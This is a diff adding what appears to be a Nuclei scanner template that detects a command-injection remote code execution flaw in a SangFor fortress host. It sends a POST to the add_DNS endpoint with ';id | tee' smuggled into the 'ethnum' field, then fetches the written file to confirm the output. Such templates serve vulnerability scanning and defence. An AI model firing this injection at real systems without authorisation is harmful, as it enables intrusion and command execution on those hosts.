@@ -1,0 +1,37 @@
+id: SangFor-change_net-Rce
+
+info:
+  name: SangFor-change_net-Rce
+  author: iSee857
+  severity: critical
+  description: |
+    SangFor-change_net-Rce
+  tags: sangfor
+
+variables:
+  random: '{{rand_text_alpha(5)}}'
+
+http:
+  - raw:
+      - |
+        POST /fort/system;help/netConfig/add_DNS HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        Accept-Language: zh-CN
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: {{len("sta=static&ipv=4&ethnum=;id | tee /usr/local/tomcat/webapps/fort/trust/version/{{random}}.txt;&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3")}}
+
+        sta=static&ipv=4&ethnum=;id | tee /usr/local/tomcat/webapps/fort/trust/version/{{random}}.txt;&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
+      - |
+        GET /fort/trust/version/{{random}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=.*gid=.*"
